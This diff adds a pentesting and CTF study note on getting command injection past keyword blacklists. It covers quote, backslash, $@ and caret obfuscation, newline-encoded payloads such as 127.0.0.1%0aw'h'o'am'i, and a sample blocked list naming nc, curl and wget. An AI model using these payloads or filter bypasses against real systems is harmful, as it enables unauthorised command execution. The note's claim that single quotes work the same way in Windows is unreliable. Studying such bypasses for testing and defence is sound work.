@@ -1,0 +1,402 @@
+# Command Injection – Bypassing Blacklisted Commands
+
+## Overview
+
+Some applications attempt to block command injection by filtering **specific command keywords**.
+
+Example blocked commands:
+
+```
+whoami
+cat
+ls
+pwd
+id
+bash
+sh
+nc
+curl
+wget
+```
+
+These filters usually rely on simple string matching.
+
+Example PHP blacklist:
+
+```php
+$blacklist = ['whoami', 'cat', 'ls'];
+
+foreach ($blacklist as $word) {
+    if (strpos($_POST['ip'], $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+
+Weakness:
+
+filters often look for **exact matches**.
+
+If we slightly modify the appearance of a command while keeping its functionality intact, we can bypass the filter.
+
+This technique is known as **command obfuscation**.
+
+---
+
+# 1. Why Command Obfuscation Works
+
+Command interpreters:
+
+- Bash (Linux)
+- sh
+- PowerShell
+- CMD
+
+often ignore certain characters when parsing commands.
+
+If characters are ignored during parsing but still modify the string representation, filters may not recognise the command.
+
+Example concept:
+
+```
+whoami  →  w'h'o'am'i
+```
+
+Shell interpretation:
+
+```
+whoami
+```
+
+Filter interpretation:
+
+```
+w'h'o'am'i
+```
+
+Filter fails to detect blacklisted word.
+
+Command executes successfully.
+
+---
+
+# 2. Using Quotes for Obfuscation (Linux & Windows)
+
+Quotes can be inserted between characters.
+
+Single quotes:
+
+```
+w'h'o'am'i
+```
+
+Double quotes:
+
+```
+w"h"o"am"i
+```
+
+Both execute correctly.
+
+Example:
+
+```bash
+w'h'o'am'i
+```
+
+Output:
+
+```
+www-data
+```
+
+Rules:
+
+- quotes must be balanced
+- avoid mixing quote types incorrectly
+- quotes do not affect command execution
+- works in both Linux and Windows environments
+
+---
+
+# 3. Example Injection Payload
+
+Payload:
+
+```
+127.0.0.1%0aw'h'o'am'i
+```
+
+Command executed:
+
+```bash
+ping -c 1 127.0.0.1
+whoami
+```
+
+Filter sees:
+
+```
+w'h'o'am'i
+```
+
+Command executes normally.
+
+---
+
+# 4. Linux-Only Obfuscation Techniques
+
+Linux shells ignore certain characters during parsing.
+
+Useful characters:
+
+```
+\
+$@
+```
+
+---
+
+## Using backslash
+
+Backslash escapes characters but still allows execution.
+
+Example:
+
+```
+w\ho\am\i
+```
+
+Executed as:
+
+```
+whoami
+```
+
+---
+
+## Using positional parameter $@
+
+$@ expands to positional parameters.
+
+If no parameters exist, expansion results in empty string.
+
+Example:
+
+```
+who$@ami
+```
+
+Shell interpretation:
+
+```
+whoami
+```
+
+Filter interpretation:
+
+```
+who$@ami
+```
+
+Blacklist bypass achieved.
+
+---
+
+# 5. Windows-Only Obfuscation Techniques
+
+Windows CMD supports caret character:
+
+```
+^
+```
+
+Caret escapes characters without affecting execution.
+
+Example:
+
+```
+who^ami
+```
+
+Executed as:
+
+```
+whoami
+```
+
+Filter sees:
+
+```
+who^ami
+```
+
+Command executes successfully.
+
+---
+
+# 6. Combining Obfuscation with Other Bypass Techniques
+
+Obfuscation can be combined with:
+
+- newline injection
+- ${IFS}
+- tab substitution
+- environment variable expansion
+
+Example payload:
+
+```
+127.0.0.1%0aw'h'o'am'i
+```
+
+Example payload:
+
+```
+127.0.0.1%0awho$@ami
+```
+
+Example payload:
+
+```
+127.0.0.1%0aw\ho\am\i
+```
+
+Example Windows payload:
+
+```
+127.0.0.1%0awho^ami
+```
+
+---
+
+# 7. Alternative Commands
+
+If command blocked entirely, use alternatives.
+
+Example equivalents:
+
+| Goal | Command |
+|------|--------|
+| current user | whoami |
+| current user | id |
+| hostname | hostname |
+| OS version | uname -a |
+| directory listing | ls |
+| working directory | pwd |
+
+Example payload:
+
+```
+127.0.0.1%0aid
+```
+
+---
+
+# 8. Detection vs Obfuscation Mindset
+
+Filters typically detect:
+
+- exact strings
+- obvious patterns
+- known malicious keywords
+
+They rarely detect:
+
+- broken command strings
+- obfuscated syntax
+- variable-expanded commands
+- dynamically generated commands
+
+Command parsing logic often differs from filter logic.
+
+This mismatch creates bypass opportunities.
+
+---
+
+# 9. Practical Payload Examples
+
+## quote obfuscation
+
+```
+w'h'o'am'i
+```
+
+## double quote obfuscation
+
+```
+w"h"o"am"i
+```
+
+## positional parameter obfuscation
+
+```
+who$@ami
+```
+
+## backslash obfuscation
+
+```
+w\ho\am\i
+```
+
+## Windows caret obfuscation
+
+```
+who^ami
+```
+
+---
+
+# 10. Testing Workflow
+
+Step 1 – identify blocked command
+
+```
+whoami
+```
+
+Step 2 – insert obfuscation characters
+
+```
+w'h'o'am'i
+```
+
+Step 3 – combine with injection operator
+
+```
+127.0.0.1%0aw'h'o'am'i
+```
+
+Step 4 – verify output differences
+
+Step 5 – test alternative obfuscation techniques
+
+---
+
+# 11. Key Takeaways
+
+- command filters often rely on string matching
+- modifying command appearance bypasses blacklist detection
+- quotes commonly ignored during shell parsing
+- Linux allows insertion of $@ and backslashes
+- Windows allows caret insertion
+- obfuscation does not change command behaviour
+- multiple obfuscation techniques increase reliability
+- understanding shell parsing rules enables consistent bypass
+
+---
+
+# Tags
+
+#command-injection
+#filter-bypass
+#command-obfuscation
+#waf-bypass
+#linux
+#windows
+#powershell
+#rce
+#pentesting
+#ctf
+#obsidian
